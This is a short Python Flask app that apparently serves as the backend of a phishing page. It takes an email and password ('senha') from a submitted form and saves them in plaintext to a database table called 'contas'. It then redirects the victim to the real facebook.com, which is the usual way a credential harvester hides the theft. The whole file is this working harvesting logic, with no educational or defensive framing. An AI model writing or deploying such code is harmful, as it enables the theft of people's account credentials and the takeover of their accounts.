from flask import Flask, render_template, request, url_for, redirect
import psycopg2
import os
from boto.s3.connection import S3Connection

app = Flask(__name__)

def connect_to_db():
    connection = psycopg2.connect(
        host=os.environ['host'],
        database=os.environ['database'],
        port=os.environ['port'],
        user=os.environ['user'],
        password=os.environ['password'],
    )
    return connection

@app.route('/', methods=('GET', 'POST'))
def home():
    if request.method == 'POST':
        email = request.form['email']
        senha = request.form['senha']

        connection = connect_to_db()
        cursor = connection.cursor()
        cursor.execute(
            'INSERT INTO contas (email, senha)'
            'VALUES (%s, %s)',
            (email, senha)
        )
        connection.commit()
        cursor.close()
        connection.close()

        return redirect("https://facebook.com")
    return render_template('index.html')